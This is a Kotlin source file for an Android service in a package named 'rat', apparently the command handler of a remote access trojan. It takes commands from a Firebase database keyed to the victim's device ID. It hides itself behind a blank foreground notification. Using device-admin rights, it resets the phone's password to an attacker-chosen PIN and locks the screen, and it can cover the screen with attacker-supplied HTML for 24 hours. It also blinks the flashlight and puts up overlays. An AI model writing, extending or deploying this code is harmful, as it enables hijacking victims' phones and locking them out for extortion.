package com.tumbal.rat

import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.ViewGroup
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.TextView
import androidx.core.app.NotificationCompat
import com.google.firebase.database.FirebaseDatabase
import java.util.Timer
import java.util.TimerTask
import kotlin.concurrent.thread

class CoreService : Service() {

    private lateinit var dbRef: com.google.firebase.database.DatabaseReference
    private lateinit var cameraManager: CameraManager
    private lateinit var dpm: DevicePolicyManager
    private lateinit var windowManager: WindowManager
    private var flashTimer: Timer? = null
    private var overlayView: android.view.View? = null
    private var webViewLock: WebView? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()

        val deviceId = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )

        dbRef = FirebaseDatabase.getInstance().reference.child("commands").child(deviceId)
        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // Foreground service dengan channel ID kosong (cukup untuk testing)
        startForeground(1, NotificationCompat.Builder(this, "").apply {
            setContentTitle("")
            setContentText("")
        }.build())

        dbRef.addValueEventListener(object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                val cmd = snapshot.value as? Map<*, *> ?: return
                when (cmd["type"]) {
                    "camera_rear" -> activateRearCamera()
                    "flash_blink" -> toggleFlashBlink()
                    "lock_pin" -> lockWithPin(cmd["pin"].toString())
                    "lock_html" -> lockWithCustomHtml(cmd["html"].toString())
                }
                dbRef.removeValue()
            }

            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                // ignore
            }
        })
    }

    private fun activateRearCamera() {
        thread {
            try {
                val camId = cameraManager.cameraIdList.find {
                    cameraManager.getCameraCharacteristics(it)
                        .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
                } ?: return@thread

                val tv = TextView(this).apply {
                    text = "📷 KAMERA BELAKANG AKTIF (Preview)"
                    setTextColor(0xFFFFFFFF.toInt())
                    setBackgroundColor(0x88000000.toInt())
                    textSize = 24f
                    gravity = Gravity.CENTER
                }

                windowManager.addView(tv, WindowManager.LayoutParams().apply {
                    type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    width = ViewGroup.LayoutParams.MATCH_PARENT
                    height = ViewGroup.LayoutParams.MATCH_PARENT
                    gravity = Gravity.CENTER
                })

                overlayView = tv

                handler.postDelayed({
                    removeOverlay()
                }, 10000)

            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun removeOverlay() {
        overlayView?.let {
            try {
                windowManager.removeView(it)
            } catch (_: Exception) {
            }
            overlayView = null
        }
    }

    private fun toggleFlashBlink() {
        if (flashTimer != null) {
            flashTimer?.cancel()
            flashTimer = null
            return
        }

        flashTimer = Timer().apply {
            scheduleAtFixedRate(object : TimerTask() {
                override fun run() {
                    try {
                        val camId = cameraManager.cameraIdList[0]
                        cameraManager.setTorchMode(camId, System.currentTimeMillis() % 1800 < 900)
                    } catch (_: Exception) {
                    }
                }
            }, 0, 900)
        }
    }

    private fun lockWithPin(pin: String) {
        if (pin.length < 4) return

        val adminName = ComponentName(this, AdminReceiver::class.java)
        if (dpm.isAdminActive(adminName)) {
            dpm.resetPassword(pin, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
            dpm.lockNow()
        }

        val block = TextView(this).apply {
            text = "🔒 TERKUNCI PIN"
            setTextColor(0xFFFFFFFF.toInt())
            setBackgroundColor(0xFF000000.toInt())
            textSize = 48f
            gravity = Gravity.CENTER
        }

        windowManager.addView(block, WindowManager.LayoutParams().apply {
            type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            flags = WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            width = ViewGroup.LayoutParams.MATCH_PARENT
            height = ViewGroup.LayoutParams.MATCH_PARENT
        })

        handler.postDelayed({
            try {
                windowManager.removeView(block)
            } catch (_: Exception) {
            }
        }, 5000)
    }

    private fun lockWithCustomHtml(htmlContent: String) {
        val webView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            webViewClient = WebViewClient()

            addJavascriptInterface(
                object {
                    @android.webkit.JavascriptInterface
                    fun dismissLock() {
                        handler.post {
                            removeCustomLock()
                        }
                    }
                },
                "AndroidLock"
            )

            loadDataWithBaseURL("https://controller/", htmlContent, "text/html", "UTF-8", null)
        }

        webViewLock = webView

        windowManager.addView(webView, WindowManager.LayoutParams().apply {
            type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            flags = WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            width = ViewGroup.LayoutParams.MATCH_PARENT
            height = ViewGroup.LayoutParams.MATCH_PARENT
        })

        handler.postDelayed({
            removeCustomLock()
        }, 86400000L) // 24 jam
    }

    private fun removeCustomLock() {
        webViewLock?.let {
            try {
                windowManager.removeView(it)
            } catch (_: Exception) {
            }
            webViewLock = null
        }
    }

    override fun onDestroy() {
        flashTimer?.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
